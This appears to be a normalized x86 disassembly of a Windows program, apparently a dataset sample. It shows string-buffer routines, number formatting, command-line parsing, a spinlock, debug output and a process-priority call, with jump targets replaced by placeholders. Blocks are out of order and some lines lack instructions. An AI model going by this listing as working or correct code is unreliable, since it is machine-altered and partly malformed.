call ebx
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ esi + 0xc ]
call sub_40c43b
lea edi [ esi + 0x4 ]
add esp 0x10
mov ecx edi
call sub_4023b8
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_40f627
mov al [ eax ]
mov [ edi + ebx ] al
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
pop edi
pop ebx
push [ ebp - 0xc ]
call sub_410a7a
push ebx
call sub_410d3e
push 0x100
mov [ esi ] 0x1
call sub_411160
add esp 0xc
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
call sub_40f5f9
xor edi edi
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax ]
push eax
mov ecx edi
call sub_40f645
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax edi
push 0x7
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
push 0x9
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x61
push edx
call sub_40f645
inc edi
cmp edi 0x9d
jl r-xdata
push 0x9
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x30
push edx
call sub_40f645
push 0x14
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x61
push edx
call sub_40f645
push 0xf
pop ecx
mov eax edi
cdq
idiv ecx
push 0x7a
pop eax
lea ecx [ ebp - 0x24 ]
sub al dl
push eax
call sub_40f645
mov eax [ ebp - 0x1c ]
mov ebx eax
add eax 0xfffffffe
push eax
lea ecx [ ebp - 0x24 ]
call sub_40f627
movsx eax [ eax ]
dec ebx
push ebx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] eax
call sub_40f627
movsx eax [ eax ]
add eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sar eax 0x1
push eax
call sub_40f645
mov eax edi
push 0x3
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_40cbc9
push [ esi + 0xc ]
call sub_411160
push [ esi + 0xc ]
mov edi eax
push [ esi + 0x8 ]
push edi
call sub_4110cf
lea eax [ ebp - 0x14 ]
push eax
push [ esi + 0xc ]
push edi
call sub_40cc37
push [ esi + 0xc ]
push edi
push [ esi + 0x8 ]
call sub_4110cf
push edi
call sub_410a7a
add esp 0x38
push 0x40
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
lea ecx [ ebp - 0x24 ]
call sub_40f609
push [ ebp - 0x14 ]
call sub_410a7a
pop ecx
sub_40f06f
mov ecx [ esp + 0x4 ]
inc eax
mov [ ecx ] eax
jmp r-xdata
cmp [ eax + 0x1 ] 0x45
jne r-xdata
mov eax [ ecx ]
cmp [ eax ] 0x48
jne r-xdata
cmp [ eax + 0x2 ] 0x52
jne r-xdata
cmp [ eax + 0x3 ] 0x4f
je r-xdata
add [ ecx ] 0x4
retn
sub_40f09c
push ebp
mov ebp esp
push edx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push [ edx + 0x8 ]
pop [ eax + 0xb8 ]
push [ edx + 0xc ]
pop [ eax + 0xc4 ]
push [ edx + 0x10 ]
pop [ eax + 0xb4 ]
mov eax 0x0
pop edx
leave
retn
sub_40f0c9
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub_40f0f3
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x14 ]
call sub_40f34c
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
leave
retn 0x4
push [ ebp - 0x14 ]
call sub_410a7a
pop ecx
sub_40f11c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
pusha
mov eax [ ebp + 0x8 ]
mov ebx 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ebx
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
[ eax ] ebx
test ebx ebx
jne r-xdata
popa
pop edi
pop esi
pop ebx
leave
retn
sub_40f150
push ebp
mov ebp esp
push ebx
push esi
push edi
pusha
mov eax [ ebp + 0x8 ]
mov ebx 0x0
[ eax ] ebx
popa
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40f16a
push ebp
mov ebp esp
sub esp 0x24
push edi
push rw-data
call sub_40f11c
pop ecx
mov [ ebp - 0x8 ] rw-data
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
push rw-data
call sub_40f150
pop ecx
push [ ebp - 0x8 ]
call sub_40f11c
pop ecx
mov al 0x1
push r--data
call [ OutputDebugStringA@IAT ]
mov [ ebp - 0x18 ] 0x0
xor eax eax
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
and [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x10
call sub_411160
pop ecx
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0xf ] 0x0
and [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
push 0xa
pop ecx
div ecx
add edx 0x30
push 0x8
pop eax
sub eax [ ebp - 0xc ]
mov [ ebp + eax - 0x18 ] dl
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
push 0xa
pop ecx
div ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
and [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
and [ eax + 0xc ] 0x0
mov eax [ ebp - 0x20 ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push rw-data
call sub_40f150
pop ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ OutputDebugStringA@IAT ]
mov eax [ ebp - 0xc ]
movsx eax [ ebp + eax - 0x18 ]
test eax eax
jne r-xdata
jmp r-xdata
pop edi
leave
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + eax - 0x18 ] 0x20
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
sub_40f2e7
push ebp
mov ebp esp
push ecx
push rw-data
call sub_40f11c
pop ecx
mov [ ebp - 0x4 ] rw-data
mov eax [ ebp - 0x4 ]
and [ eax + 0xc ] 0x0
push rw-data
call sub_40f150
pop ecx
push [ ebp - 0x4 ]
call sub_40f150
pop ecx
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
push rw-data
call sub_40f150
pop ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
leave
retn
sub_40f34c
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
leave
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
and [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
call sub_40f34c
xor eax eax
inc eax
and eax 0x1
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
push [ ebp - 0xc ]
call sub_410a7a
pop ecx
jmp r-xdata
sub_40f3ae
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
imul eax eax 0x3
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
add ebx 0x10
cmp edi 0x6400000
mov esi ecx
ja r-xdata
xor al al
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ esi ]
jl r-xdata
lea eax [ edi + 0x4 ]
push eax
push 0x40
mov [ esi + 0x8 ] edi
mov [ esi ] edi
call [ GlobalAlloc@IAT ]
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] eax
jne r-xdata
mov [ esi + 0x8 ] edi
push ebx
push 0x40
call [ GlobalAlloc@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc edi
push edi
push ecx
push eax
call sub_41112d
add esp 0xc
jmp r-xdata
mov [ esi ] ecx
mov [ esi + 0x8 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push ebx
push 0x0
push eax
call sub_41112d
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x8 ]
call sub_4110f1
add esp 0x18
push [ esi + 0x4 ]
call [ GlobalFree@IAT ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov [ eax + ecx ] 0x0
mov al 0x1
jmp r-xdata
sub_40f45c
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
push edi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
push 0x40
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push edi
push eax
call sub_4110cf
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_40f4c7
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
push edi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
push 0x40
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push edi
push eax
call sub_4110f1
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_40f532
push ebx
xor ebx ebx
cmp [ esp + 0x8 ] ebx
push esi
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
mov eax [ esp + 0x10 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
push 0x40
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push [ esp + 0x10 ]
push eax
call sub_4110f1
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
mov eax esi
pop esi
pop ebx
retn 0x8
sub_40f594
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ esp + 0x10 ]
mov [ esi + 0xc ] bl
mov eax [ edi + 0x8 ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
push 0x40
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push [ edi + 0x4 ]
push eax
call sub_4110f1
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_40f645
push ebx
push ebp
push esi
mov esi ecx
mov ecx [ esi ]
xor ebx ebx
cmp ecx ebx
push edi
jne r-xdata
mov eax ecx
imul eax eax 0x3
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi 0x10
mov edi 0xa00
jmp r-xdata
cmp ecx [ esi + 0x8 ]
jg r-xdata
mov [ esi + 0x8 ] ebx
cmp [ esi + 0x8 ] ebx
jge r-xdata
inc [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov dl [ esp + 0x14 ]
mov [ ecx + eax - 0x1 ] dl
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov [ eax + ecx ] bl
mov eax [ esi + 0x8 ]
dec eax
cmp [ esi + 0x4 ] ebx
lea eax [ edi + 0x4 ]
push eax
push 0x40
jne r-xdata
call [ GlobalAlloc@IAT ]
mov ebp eax
cmp ebp ebx
je r-xdata
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
push ebx
push ebp
call sub_41112d
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push ebp
call sub_4110f1
add esp 0x18
push [ esi + 0x4 ]
call [ GlobalFree@IAT ]
mov [ esi + 0x4 ] ebp
mov [ esi ] edi
mov [ esi ] ebx
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_40f70c
push ebp
mov ebp esp
push esi
push edi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40f594
mov edi [ ebp + 0x14 ]
xor esi esi
test edi edi
jle r-xdata
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push esi
lea ecx [ ebp + 0xc ]
call sub_40f627
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_40f645
inc esi
cmp esi edi
jl r-xdata
sub_40f74e
push esi
push ecx
mov ecx [ esp + 0xc ]
call sub_40f594
mov esi [ esp + 0xc ]
push esi
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
push edi
mov edi eax
movzx eax [ esi ]
mov ecx [ esp + 0xc ]
push eax
call sub_40f645
inc esi
dec edi
jne r-xdata
pop edi
sub_40f785
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_4023b8
mov esi [ ebp + 0xc ]
push esi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
jg r-xdata
mov ecx [ ebp + 0x8 ]
push edi
call sub_40f594
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x8
test eax eax
jle r-xdata
push ebx
mov ebx eax
movzx eax [ esi ]
push eax
mov ecx edi
call sub_40f645
inc esi
dec ebx
jne r-xdata
pop ebx
sub_40f7cb
push ebp
mov ebp [ esp + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
mov eax ecx
cmp [ eax + 0x8 ] edi
je r-xdata
push ebx
push esi
xor esi esi
test edi edi
jle r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov ebx [ eax + 0x4 ]
pop edi
pop ebp
retn 0x4
xor al al
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
pop esi
pop ebx
push esi
mov ecx ebp
call sub_40f627
mov cl [ ebx + esi ]
cmp cl [ eax ]
jne r-xdata
sub_40f80b
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd ]
push eax
mov esi ecx
call sub_40f785
lea ecx [ ebp - 0xd ]
call sub_40f609
mov ecx [ ebp + 0x8 ]
push esi
call sub_40f594
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0x14
sub_40f866
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x8 ]
jg r-xdata
or eax 0xffffffff
test edi edi
jl r-xdata
push ebx
mov ebx [ esp + 0x14 ]
push ebx
call sub_40f645
mov eax [ esi + 0x8 ]
jmp r-xdata
dec eax
cmp eax edi
jg r-xdata
mov ecx [ esi + 0x4 ]
add ecx eax
mov dl [ ecx - 0x1 ]
mov [ ecx ] dl
mov eax [ esi + 0x4 ]
mov [ edi + eax ] bl
mov eax edi
pop ebx
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_40f8d4
push 0x27f5a5a
xor eax eax
fninit
fnstsw [ esp ]
cmp [ esp ] al
jne r-xdata
pop edx
retn
fnstcw [ esp ]
mov dx 0x103f
and edx [ esp ]
cmp dx 0x3f
jne r-xdata
inc eax
fldcw [ esp + 0x2 ]
sub_40f929
push esi
mov esi [ esp + 0x8 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
add esi 0x4
call eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
test eax eax
jne r-xdata
pop esi
retn
sub_40f950
push esi
push edi
xor edx edx
mov esi [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
push edx
jecxz r-xdata
cmp al 0x20
jbe r-xdata
lea eax [ edx + 0x10 ]
mov ecx [ esp + 0x14 ]
pop edx
jecxz r-xdata
xor eax eax
stosd [ edi ]
mov [ ecx ] eax
lodsb [ esi ]
dec esi
xor eax eax
jecxz r-xdata
pop edi
pop esi
retn
mov [ ecx ] edx
inc [ esp ]
add edx 0x5
mov ah 0x20
stosb [ edi ]
mov [ ecx ] edi
add ecx 0x4
cmp al 0x5c
jne r-xdata
xor ah 0x20
je r-xdata
cmp al ah
jbe r-xdata
push ecx
xor ecx ecx
lodsb [ esi ]
lodsb [ esi ]
test al al
je r-xdata
jecxz r-xdata
inc ecx
lodsb [ esi ]
cmp al 0x5c
je r-xdata
dec esi
cmp al 0x22
jne r-xdata
inc edx
jmp r-xdata
stosb [ edi ]
add edx ecx
mov al 0x5c
cmp [ esp ] 0x0
je r-xdata
shr ecx 0x1
jae r-xdata
pop ecx
lodsb [ esi ]
cmp al 0x5c
jne r-xdata
[ edi ]
dec esi
cmp al 0x22
jne r-xdata
lodsb [ esi ]
sub_40f9d4
push esi
push edi
push ebx
xor eax eax
cdq
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
push edx
jecxz r-xdata
cmp eax 0x20
jbe r-xdata
lea eax [ edx + 0x10 ]
mov ecx [ esp + 0x18 ]
pop edx
jecxz r-xdata
stosd [ edi ]
mov [ ecx ] eax
lodsw [ esi ]
dec esi
dec esi
xor eax eax
jecxz r-xdata
pop ebx
pop edi
pop esi
retn
mov [ ecx ] edx
inc [ esp ]
add edx 0x6
xor ebx ebx
mov bl 0x20
stosw [ edi ]
mov [ ecx ] edi
add ecx 0x4
cmp eax 0x5c
jne r-xdata
xor ebx 0x20
je r-xdata
cmp eax ebx
jbe r-xdata
push ecx
xor ecx ecx
lodsw [ esi ]
lodsw [ esi ]
test eax eax
je r-xdata
jecxz r-xdata
inc ecx
lodsw [ esi ]
cmp eax 0x5c
je r-xdata
dec esi
dec esi
cmp eax 0x22
jne r-xdata
inc edx
inc edx
jmp r-xdata
stosw [ edi ]
add edx ecx
xor eax eax
cmp [ esp ] eax
mov al 0x5c
je r-xdata
shr ecx 0x1
jae r-xdata
pop ecx
lodsw [ esi ]
cmp eax 0x5c
jne r-xdata
[ edi ]
dec esi
dec esi
cmp eax 0x22
jne r-xdata
lodsw [ esi ]
sub_40fa6d
mov ecx [ eax + 0x8 ]
cmp ecx [ eax + 0xc ]
push esi
lea esi [ ecx + 0x1 ]
mov [ eax + 0x8 ] esi
pop esi
jae r-xdata
retn
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ eax ]
mov [ ecx ] dl
inc [ eax ]
push [ eax ]
push edx
call sub_410c9a
pop ecx
pop ecx
retn
sub_40fa95
push ebp
mov ebp esp
sub esp 0x28
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] 0x78
push edi
mov edi eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] bl
mov ecx r--data
je r-xdata
xor edx edx
inc edx
cmp [ esi + 0x15 ] 0xffffffff
jne r-xdata
mov ecx r--data
mov [ esi + 0xc ] 0x20
mov [ esi + 0x15 ] edx
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ esi + 0x19 ] 0x68
jne r-xdata
mov eax edi
cmp edi ebx
jge r-xdata
movsx edi di
and edi 0xffff
jmp r-xdata
jbe r-xdata
cmp [ esi + 0x15 ] ebx
je r-xdata
mov eax edi
neg eax
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor edx edx
div [ ebp + 0xc ]
mov ebx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test eax eax
mov dl [ edx + ecx ]
mov [ ebp + ebx - 0x28 ] dl
ja r-xdata
mov [ ebp - 0x28 ] 0x30
mov [ ebp - 0x8 ] edx
cmp eax ebx
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x15 ]
mov ebx [ ebp - 0x8 ]
cmp ebx eax
ja r-xdata
cmp edi ebx
jl r-xdata
xor ebx ebx
mov ecx [ ebp - 0x8 ]
cmp ecx eax
mov [ ebp + 0x14 ] ecx
ja r-xdata
mov ebx eax
mov [ ebp - 0x1 ] 0x2d
cmp [ esi + 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp + 0x14 ] eax
cmp [ esi + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor edi edi
cmp [ esi + 0xd ] edi
je r-xdata
inc [ ebp + 0x14 ]
mov [ ebp - 0x1 ] 0x20
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ ebp + 0x10 ] 0x6f
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ esi + 0xc ] 0x20
jne r-xdata
cmp [ esi + 0xd ] edi
je r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0xd ] edi
je r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_40fa6d
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp [ ebp + 0xc ] 0x8
je r-xdata
cmp ebx ecx
jbe r-xdata
cmp [ esi + 0xc ] 0x30
jne r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ ebp + 0xc ] 0x8
je r-xdata
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
inc [ ebp + 0x14 ]
cmp [ ebp + 0xc ] 0x10
jne r-xdata
mov [ esi + 0xd ] edi
mov eax [ ebp + 0x14 ]
cmp eax [ esi + 0x11 ]
jae r-xdata
sub ebx [ ebp - 0x8 ]
mov edi ebx
je r-xdata
cmp [ esi + 0xc ] 0x30
jne r-xdata
push 0x30
pop edx
cmp [ ebp + 0xc ] 0x10
jne r-xdata
xor edi edi
mov eax [ ebp + 0x8 ]
push 0x20
pop edx
call sub_40fa6d
dec edi
jne r-xdata
inc [ ebp + 0x14 ]
mov [ esi + 0xd ] edi
mov edi [ ebp - 0x8 ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_40fa6d
dec edi
jne r-xdata
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_40fa6d
movzx edx [ ebp + 0x10 ]
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
lea ebx [ ebp - 0x28 ]
dec ebx
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_40fa6d
pop edi
pop ebx
leave
retn
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
movzx edx [ ebx + edi ]
mov eax [ ebp + 0x8 ]
call sub_40fa6d
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_40fa6d
dec edi
jne r-xdata
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
movzx edx [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_40fa6d
dec edi
jne r-xdata
sub_40fc86
mov ecx [ edx ]
push ebx
push esi
mov esi eax
mov eax ecx
and eax 0x80000000
neg eax
sbb eax eax
shr ecx 0x14
and eax 0xfffffffe
and ecx 0x7ff
sub ecx 0x3ff
inc eax
cmp [ esi + 0x15 ] 0xffffffff
mov ebx ecx
jne r-xdata
and [ edx ] 0xfffff
test eax eax
jle r-xdata
mov [ esi + 0x15 ] 0x6
mov al 0x2d
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov al 0x2b
jmp r-xdata
mov eax [ esp + 0xc ]
push 0x65
pop edx
call sub_40fa6d
push 0x0
push 0x64
push 0xa
push [ esp + 0x18 ]
mov eax ebx
call sub_40fa95
add esp 0x10
pop esi
pop ebx
retn
mov al 0x20
jmp r-xdata
movzx edx al
mov eax [ esp + 0xc ]
call sub_40fa6d
sub_40fd08
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ eax + 0xc ] ebx
mov [ ebp + 0x8 ] esi
jne r-xdata
cmp [ esi ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
add edi 0xfffffffc
jmp r-xdata
pop esi
pop ebx
leave
retn
mov al [ esi ]
or [ ebp - 0x17 ] 0xffffffff
xor ecx ecx
inc ecx
test al al
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1f ] ebx
mov [ ebp - 0x1b ] ebx
mov [ ebp - 0x13 ] 0x0
je r-xdata
movzx eax [ esi ]
lea edx [ eax - 0x30 ]
cmp edx 0xa
jae r-xdata
cmp al 0x25
je r-xdata
cmp [ esi ] 0x2a
jne r-xdata
mov edx [ ebp - 0x1b ]
imul edx edx 0xa
lea eax [ edx + eax - 0x30 ]
inc esi
mov [ ebp - 0x1b ] eax
movzx eax [ esi ]
lea edx [ eax - 0x30 ]
cmp edx 0xa
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
movzx edx al
mov eax [ ebp + 0xc ]
call sub_40fa6d
inc esi
mov al [ esi ]
xor ecx ecx
